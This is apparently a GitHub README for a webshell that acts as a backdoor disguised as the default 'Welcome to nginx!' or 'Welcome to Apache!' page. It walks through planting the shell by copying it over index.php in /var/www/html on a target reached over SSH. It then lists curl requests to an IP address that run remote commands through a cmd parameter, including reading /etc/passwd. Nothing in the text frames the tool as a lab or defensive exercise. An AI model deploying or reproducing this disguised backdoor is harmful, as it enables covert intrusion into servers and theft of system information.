# Webshell 
By Stacey Zheng

A custom webshell tool acting as a service backdoor but disguised as a "Welcome to nginx!" or "Welcome to Apache!" page.

## Prerequisites
- Git
- Curl 
- SSH session establshed with the target machine

## Instructions of Use
1) Change directory to /var/www/html
```
cd /var/www/html
```

2) Clone repo from Git (or download the files)
```
sudo git clone https://github.com/Szheng25/webshell.git
```

3) Copy webshell_nginx.php or webshell_apache.php into index.php 
```
sudo cp webshell/webshell_nginx.php index.php
```
```
sudo cp webshell/webshell_apache.php index.php
```

4) Use curl to execute commands like `ls`, `ip a`, and `cat /etc/passwd` 
```
curl “http://100.65.2.74/index.php?cmd=ls”
curl “http://100.65.2.74/index.php?cmd=ip+a”
curl “http://100.65.2.74/index.php?cmd=cat+/etc/passwd”
```